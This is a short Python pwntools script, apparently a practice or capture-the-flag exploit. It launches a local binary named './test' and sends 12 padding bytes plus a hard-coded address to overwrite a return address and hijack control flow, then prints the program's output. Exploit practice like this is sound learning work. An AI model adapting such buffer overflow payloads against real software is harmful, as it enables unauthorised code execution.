from pwn import *

io = process('./test')
io.sendline(4*'A'+8*'A'+'\x57\x05\x40\x00\x00\x00')

print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))
print(io.recvrepeat(timeout = 10))


